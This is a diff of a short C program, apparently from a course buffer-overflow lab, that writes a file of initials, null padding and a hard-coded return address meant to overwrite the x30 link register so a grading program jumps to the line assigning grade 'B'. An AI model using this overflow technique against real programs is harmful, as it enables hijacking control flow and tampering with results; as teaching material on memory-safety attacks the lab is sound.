@@ -6,26 +6,25 @@
 #include <string.h>
 
 int main() {
+    size_t i; /* index for the loop */
+    FILE *psFile; /* file */
+    unsigned long address = 0x400890; /* address of grade = 'B' */
+
     /* create and open file dataB */
-    size_t i;
-    char *names = "Nora and Teddy";
-    FILE *psFile;
     psFile = fopen("dataB", "w");
 
     /* put names into file */
     fprintf(psFile, "%c", 'N');
-
-    /* for (i = 0; i < strlen(names); i++) {
-        fprintf(psFile, "%c", names[i]);
-    }
+    fprintf(psFile, "%c", '&');
+    fprintf(psFile, "%c", 'T');
     fprintf(psFile, "%c", '\0'); /* terminating null byte */
 
     /* fill remaining buffer */
-    for (i = 0; i < (48 - strlen(names) -1); i++) {
+    for (i = 0; i < (48 - 4); i++) {
         fprintf(psFile, "%c", '\0');
     }
 
     /* change x30 */
-
+    fwrite(&address, sizeof(address), 1, psFile);
     return 0;
 }
